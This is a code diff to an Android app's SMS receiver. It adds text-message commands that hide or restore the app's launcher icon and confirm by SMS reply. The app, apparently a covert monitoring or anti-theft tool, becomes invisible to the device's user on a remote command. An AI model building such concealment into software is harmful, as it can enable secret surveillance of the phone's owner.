@@ -1,8 +1,10 @@
 package com.ghostwatch.app.receiver
 
 import android.content.BroadcastReceiver
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Build
 import android.provider.Telephony
 import android.telephony.SmsManager
@@ -10,6 +12,7 @@ import android.telephony.SmsMessage
 import android.util.Log
 import com.ghostwatch.app.GhostConfig
 import com.ghostwatch.app.service.GhostService
+import com.ghostwatch.app.ui.MainActivity
 
 class SmsReceiver : BroadcastReceiver() {
 
@@ -59,6 +62,20 @@ class SmsReceiver : BroadcastReceiver() {
             return
         }
 
+        if (command == GhostConfig.CMD_HIDE.uppercase()) {
+            setLauncherIconEnabled(context, false)
+            sendSms(context, sender, GhostConfig.REPLY_HIDDEN)
+            Log.d(TAG, "Launcher icon hidden")
+            return
+        }
+
+        if (command == GhostConfig.CMD_SHOW.uppercase()) {
+            setLauncherIconEnabled(context, true)
+            sendSms(context, sender, GhostConfig.REPLY_SHOWN)
+            Log.d(TAG, "Launcher icon restored")
+            return
+        }
+
         val serviceIntent = when (command) {
             GhostConfig.CMD_START.uppercase() -> Intent(context, GhostService::class.java).apply {
                 action = GhostService.ACTION_START
@@ -94,6 +111,19 @@ class SmsReceiver : BroadcastReceiver() {
         } catch (e: Exception) {
             Log.e(TAG, "SMS reply failed: ${e.message}")
         }
+    }
+
+    private fun setLauncherIconEnabled(context: Context, enabled: Boolean) {
+        val component = ComponentName(context, MainActivity::class.java)
+        val newState = if (enabled)
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+        else
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        context.packageManager.setComponentEnabledSetting(
+            component,
+            newState,
+            PackageManager.DONT_KILL_APP
+        )
     }
 
     /**
